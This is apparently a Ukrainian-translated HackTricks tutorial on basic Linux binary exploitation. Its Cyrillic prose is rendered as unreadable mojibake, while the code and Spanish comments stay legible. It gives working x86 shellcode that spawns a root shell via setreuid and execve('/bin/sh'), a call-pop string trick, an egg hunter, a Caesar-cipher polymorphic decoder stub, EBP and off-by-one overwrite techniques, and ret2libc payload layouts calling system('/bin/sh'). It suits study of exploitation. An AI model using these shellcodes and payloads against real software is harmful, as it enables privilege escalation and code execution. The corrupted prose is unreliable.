# –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è Linux (–ë–∞–∑–æ–≤–∏–π)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## **1. –ü–ï–†–ï–ü–û–í–ù–ï–ù–ù–Ø –°–¢–ï–ö–£**

> –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞, –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å—Ç–µ–∫—É, –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å—Ç–µ–∫—É, —Ä—É–π–Ω—É–≤–∞–Ω–Ω—è —Å—Ç–µ–∫—É

Segmentation fault –∞–±–æ violation of segment: –∫–æ–ª–∏ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∞–¥—Ä–µ—Å–∏ –ø–∞–º'—è—Ç—ñ, —è–∫–∞ –Ω–µ –±—É–ª–∞ –≤–∏–¥—ñ–ª–µ–Ω–∞ –ø—Ä–æ—Ü–µ—Å—É.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### –í–∏–∫–ª–∏–∫ –¥–æ sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

–ü–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –ø–µ—Ä–µ—Ä–∏–≤–∞–Ω–Ω—è —è–¥—Ä–∞: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; –æ—á–∏—â—É—î–º–æ eax\
xor ebx, ebx ; ebx = 0, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–µ–º–∞—î –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; –í–∏–∫–æ–Ω–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω–∏–π –≤–∏–∫–ª–∏–∫

**nasm -f elf assembly.asm** ‚Äî> –ü–æ–≤–µ—Ä—Ç–∞—î .o —Ñ–∞–π–ª\
**ld assembly.o -o shellcodeout** ‚Äî> –î–∞—î –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∑ –∫–æ–¥—É –∞—Å–µ–º–±–ª–µ—Ä–∞, —ñ –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–ø–∫–æ–¥–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> –©–æ–± –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ —Ü–µ –Ω–∞—à shellcode —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–ø–∫–æ–¥–∏

**–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ shellcode –ø—Ä–∞—Ü—é—î**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
–î–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—ñ –≤–∏–∫–ª–∏–∫—ñ–≤ —Å–∏—Å—Ç–µ–º–∏ –ø—Ä–æ–≥—Ä–∞–º—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **strace ./COMPILIED\_PROGRAM**

–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ shellcode –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ö–∏—Ç—Ä—ñ—Å—Ç—å. –ü–µ—Ä—à–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è - —Ü–µ —Å—Ç—Ä–∏–±–æ–∫ –¥–æ –≤–∏–∫–ª–∏–∫—É. –í–∏–∫–ª–∏–∫ –≤–∏–∫–ª–∏–∫–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∫–æ–¥ —ñ –¥–æ–¥–∞—î EIP –¥–æ —Å—Ç–µ–∫—É. –ü—ñ—Å–ª—è –≤–∏–∫–ª–∏–∫—É –º–∏ –¥–æ–¥–∞–ª–∏ –ø–æ—Ç—Ä—ñ–±–Ω–∏–π —Ä—è–¥–æ–∫, —Ç–æ–º—É –∑ —Ü–∏–º EIP –º–∏ –º–æ–∂–µ–º–æ –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ —Ä—è–¥–æ–∫ —ñ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É.

–ü–†–ò–ö–õ–ê–î **–•–ò–¢–†–Ü–°–¢–¨ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è EJ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å—Ç–µ–∫—É (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**–õ–æ–≤–µ—Ü—å —è—î—Ü—å:**

–¶–µ –Ω–µ–≤–µ–ª–∏–∫–∏–π –∫–æ–¥, —è–∫–∏–π –ø–µ—Ä–µ–≥–ª—è–¥–∞—î —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –ø–∞–º'—è—Ç—ñ, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –ø—Ä–æ—Ü–µ—Å–æ–º, —É –ø–æ—à—É–∫–∞—Ö —Ç–∞–º –∑–±–µ—Ä–µ–∂–µ–Ω–æ–≥–æ shellcode (—à—É–∫–∞—î —è–∫—É—Å—å –ø—ñ–¥–ø–∏—Å, —Ä–æ–∑–º—ñ—â–µ–Ω–∏–π —É shellcode). –ö–æ—Ä–∏—Å–Ω–∏–π —É –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ —î –ª–∏—à–µ –Ω–µ–≤–µ–ª–∏–∫–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä –¥–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∫–æ–¥—É.

**–ü–æ–ª—ñ–º–æ—Ä—Ñ–Ω—ñ shell-–∫–æ–¥–∏**

–¶–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –æ–±–æ–ª–æ–Ω–∫–∏, —è–∫—ñ –º–∞—é—Ç—å –Ω–µ–≤–µ–ª–∏–∫—ñ –∫–æ–¥–∏ –¥–ª—è —ó—Ö —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ç–∞ –ø–µ—Ä–µ—Ö–æ–¥—É –¥–æ –Ω–∏—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç—Ä—é–∫ Call-Pop, –æ—Å—å **–ø—Ä–∏–∫–ª–∞–¥ —à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ —à–∏—Ñ—Ä—É –¶–µ–∑–∞—Ä—è**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **–ê—Ç–∞–∫–∞ –Ω–∞ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ —Ä–∞–º–∫–∏ (EBP)**

–ö–æ—Ä–∏—Å–Ω–æ –≤ —Å–∏—Ç—É–∞—Ü—ñ—ó, –∫–æ–ª–∏ –º–∏ –º–æ–∂–µ–º–æ –∑–º—ñ–Ω–∏—Ç–∏ EBP, –∞–ª–µ –Ω–µ –º–æ–∂–µ–º–æ –∑–º—ñ–Ω–∏—Ç–∏ EIP.

–í—ñ–¥–æ–º–æ, —â–æ –ø—Ä–∏ –≤–∏—Ö–æ–¥—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∞—Å–µ–º–±–ª–µ—Ä–Ω–∏–π –∫–æ–¥:
```
movl               %ebp, %esp
popl                %ebp
ret
```
–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ EBP –ø—Ä–∏ –≤–∏—Ö–æ–¥—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—ó (fvuln), —è–∫–∞ –±—É–ª–∞ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ —ñ–Ω—à–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é, –∫–æ–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –≤–∏–∫–ª–∏–∫–∞–ª–∞ fvuln, –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è, —ó—ó EIP –º–æ–∂–µ –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π.

–£ fvuln –º–æ–∂–Ω–∞ –≤–≤–µ—Å—Ç–∏ —Ö–∏–±–Ω–∏–π EBP, —è–∫–∏–π –≤–∫–∞–∑—É—î –Ω–∞ –º—ñ—Å—Ü–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ shellcode + 4 (–¥–æ –Ω–µ—ó –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–æ–¥–∞—Ç–∏ 4 —á–µ—Ä–µ–∑ pop). –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –ø—Ä–∏ –≤–∏—Ö–æ–¥—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—ó, –∑–Ω–∞—á–µ–Ω–Ω—è &(\&Shellcode)+4 –±—É–¥–µ –ø–æ–º—ñ—â–µ–Ω–æ –≤ ESP, –∑ pop –≤—ñ–¥ ESP –≤—ñ–¥–Ω—ñ–º–µ—Ç—å—Å—è 4, —ñ –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –Ω–∞ –∞–¥—Ä–µ—Å—É shellcode –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + –∑–∞–ø–æ–≤–Ω—é–≤–∞—á + &(\&Shellcode)+4

**Off-by-One Exploit**\
–î–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω–∏—Ç–∏ –ª–∏—à–µ –º–µ–Ω—à –∑–Ω–∞—á—É—â–∏–π –±–∞–π—Ç EBP. –ú–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É, —Å—Ö–æ–∂—É –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—é, –∞–ª–µ –ø–∞–º'—è—Ç—å, —è–∫–∞ –∑–±–µ—Ä—ñ–≥–∞—î –∞–¥—Ä–µ—Å—É shellcode, –ø–æ–≤–∏–Ω–Ω–∞ –º—ñ—Å—Ç–∏—Ç–∏ —Ç—ñ–ª—å–∫–∏ –ø–µ—Ä—à—ñ 3 –±–∞–π—Ç–∏ —Ä–∞–∑–æ–º –∑ EBP.

## **4. –ú–µ—Ç–æ–¥–∏ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –¥–æ Libc**

–ö–æ—Ä–∏—Å–Ω–∏–π –º–µ—Ç–æ–¥, –∫–æ–ª–∏ —Å—Ç–µ–∫ –Ω–µ —î –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–º –∞–±–æ –∑–∞–ª–∏—à–∞—î –¥—É–∂–µ –º–∞–ª–æ –º—ñ—Å—Ü—è –¥–ª—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.

ASLR –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ –ø—ñ–¥ —á–∞—Å –∫–æ–∂–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è –≤ —Ä—ñ–∑–Ω—ñ –ø–æ–∑–∏—Ü—ñ—ó –ø–∞–º'—è—Ç—ñ. –¢–æ–º—É —Ü–µ–π –º–µ—Ç–æ–¥ –º–æ–∂–µ –±—É—Ç–∏ –Ω–µ–µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É. –î–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö —Å–µ—Ä–≤–µ—Ä—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –ø–æ—Å—Ç—ñ–π–Ω–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑–∞ —Ç—ñ—î—é –∂ –∞–¥—Ä–µ—Å–æ—é, —Ü–µ–π –º–µ—Ç–æ–¥ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º.

* **cdecl(C declaration)** –ü–æ–º—ñ—â–∞—î –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –≤ —Å—Ç–µ–∫, —ñ –ø—ñ—Å–ª—è –≤–∏—Ö–æ–¥—É –∑ —Ñ—É–Ω–∫—Ü—ñ—ó –æ—á–∏—â–∞—î —Å—Ç–µ–∫
* **stdcall(standard call)** –ü–æ–º—ñ—â–∞—î –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –≤ —Å—Ç–µ–∫, —ñ —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –æ—á–∏—â–∞—î –π–æ–≥–æ
* **fastcall** –ü–æ–º—ñ—â–∞—î –ø–µ—Ä—à—ñ –¥–≤–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –≤ —Ä–µ—î—Å—Ç—Ä–∏, –∞ —Ä–µ—à—Ç—É - –≤ —Å—Ç–µ–∫

–í–∫–∞–∑—É—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó system –∑ libc, —ñ —ó–π –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è —Ä—è–¥–æ–∫ "/bin/sh", –∑–∞–∑–≤–∏—á–∞–π –∑ –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó exit, —â–æ–± –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–∏–π—à–ª–∞ –±–µ–∑ –ø—Ä–æ–±–ª–µ–º –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –æ–±–æ–ª–æ–Ω–∫–∞ –±—ñ–ª—å—à–µ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–∞ (—ñ –∑–∞–ø–∏—Å—É—î –∂—É—Ä–Ω–∞–ª–∏).

**export SHELL=/bin/sh**

–î–ª—è –ø–æ—à—É–∫—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –∞–¥—Ä–µ—Å –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **GDB:**\
**p system**\
**p exit**\
**rabin2 -i –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π_—Ñ–∞–π–ª** ‚Äî> –ù–∞–¥–∞—î –∞–¥—Ä–µ—Å—É –≤—Å—ñ—Ö —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–≥—Ä–∞–º–∞ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ\
(–£ start –∞–±–æ —è–∫–æ–º—É—Å—å breakpoint): **x/500s $esp** ‚Äî> –®—É–∫–∞—î–º–æ —Ç—É—Ç —Ä—è–¥–æ–∫ /bin/sh

–ü—ñ—Å–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ü–∏—Ö –∞–¥—Ä–µ—Å **exploit** –≤–∏–≥–ª—è–¥–∞—Ç–∏–º–µ —Ç–∞–∫:

‚ÄúA‚Äù \* DISTANCIA EBP + 4 (EBP: –º–æ–∂—É—Ç—å –±—É—Ç–∏ 4 "A", –∫—Ä–∞—â–µ, —è–∫—â–æ —Ü–µ —Ä–µ–∞–ª—å–Ω–∏–π EBP, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ–º–∏–ª–æ–∫ —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—ó) + –ê–¥—Ä–µ—Å–∞ **system** (–ø–µ—Ä–µ–∑–∞–ø–∏—à–µ EIP) + –ê–¥—Ä–µ—Å–∞ **exit** (–ø—ñ—Å–ª—è –≤–∏–∫–ª–∏–∫—É system(‚Äú/bin/sh‚Äù) —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–µ—Ä—à—ñ 4 –±–∞–π—Ç–∏ —Å—Ç–µ–∫—É —Ä–æ–∑–≥–ª—è–¥–∞—é—Ç—å—Å—è —è–∫ –Ω–∞—Å—Ç—É–ø–Ω–∞ –∞–¥—Ä–µ—Å–∞ EIP –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è) + –ê–¥—Ä–µ—Å–∞ ‚Äú**/bin/sh**‚Äù (–±—É–¥–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º, –ø–µ—Ä–µ–¥–∞–Ω–∏–º —É system)

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, EIP –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ –∞–¥—Ä–µ—Å–æ—é system, —è–∫–∞ –æ—Ç—Ä–∏–º–∞—î —Ä—è–¥–æ–∫ "/bin/sh" —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä, —ñ –ø—ñ—Å–ª—è –≤–∏—Ö–æ–¥—É –∑ —Ü—å–æ–≥–æ –≤–∏–∫–æ–Ω–∞—î—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—è exit().

–ú–æ–∂–ª–∏–≤–æ, –≤–∏–Ω–∏–∫–Ω–µ —Å–∏—Ç—É–∞—Ü—ñ—è, –∫–æ–ª–∏ —è–∫–∏–π—Å—å –±–∞–π—Ç —è–∫–æ—ó—Å—å –∞–¥—Ä–µ—Å–∏ —è–∫–æ—ó—Å—å —Ñ—É–Ω–∫—Ü—ñ—ó –±—É–¥–µ –Ω—É–ª—å–æ–≤–∏–º –∞–±–æ –ø—Ä–æ–±—ñ–ª–æ–º (\x20). –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–æ–∂–Ω–∞ —Ä–æ–∑—ñ–±—Ä–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –∞–¥—Ä–µ—Å–∏ —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó, –æ—Å–∫—ñ–ª—å–∫–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, —Ç–∞–º –±—É–¥–µ –∫—ñ–ª—å–∫–∞ NOPs, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—Ç—å –Ω–∞–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –æ–¥–∏–Ω –∑ –Ω–∏—Ö –∑–∞–º—ñ—Å—Ç—å —Ñ—É–Ω–∫—Ü—ñ—ó –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ > x/8i system-4).

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é, —Ç–∞–∫—É —è–∫ system, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –æ–ø–∫–æ–¥—É **ret** –∑–∞–º—ñ—Å—Ç—å **call**, —Ñ—É–Ω–∫—Ü—ñ—è —Ä–æ–∑—É–º—ñ—î, —â–æ –ø–µ—Ä—à—ñ 4 –±–∞–π—Ç–∏ –±—É–¥—É—Ç—å –∞–¥—Ä–µ—Å–æ—é **EIP**, –Ω–∞ —è–∫—É –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è.

–¶—ñ–∫–∞–≤–æ—é —Ç–µ—Ö–Ω—ñ–∫–æ—é –∑ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º —î –≤–∏–∫–ª–∏–∫ **strncpy()** –¥–ª—è –ø–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑—ñ —Å—Ç–µ–∫—É –¥–æ –∫—É–ø–∏ —ñ –ø–æ–¥–∞–ª—å—à–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **gets()** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

–©–µ –æ–¥–Ω—ñ—î—é —Ü—ñ–∫–∞–≤–æ—é —Ç–µ—Ö–Ω—ñ–∫–æ—é —î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **mprotect()**, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ –±–∞–∂–∞–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è –±—É–¥—å-—è–∫–æ—ó —á–∞—Å—Ç–∏–Ω–∏ –ø–∞–º'—è—Ç—ñ. –í–æ–Ω–∞ –ø—Ä–∞—Ü—é—î –∞–±–æ –ø—Ä–∞—Ü—é–≤–∞–ª–∞ –≤ BDS, MacOS —Ç–∞ OpenBSD, –∞–ª–µ –Ω–µ –≤ linux (–∫–æ–Ω—Ç—Ä–æ–ª—é—î, —â–æ –Ω–µ –º–æ–∂–Ω–∞ –æ–¥–Ω–æ—á–∞—Å–Ω–æ –Ω–∞–¥–∞–≤–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –∑–∞–ø–∏—Å —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è). –ó —Ü–∏–º –∞—Ç–∞–∫–∞ –º–æ–∂–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ —Å—Ç–µ–∫ —è–∫ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π.

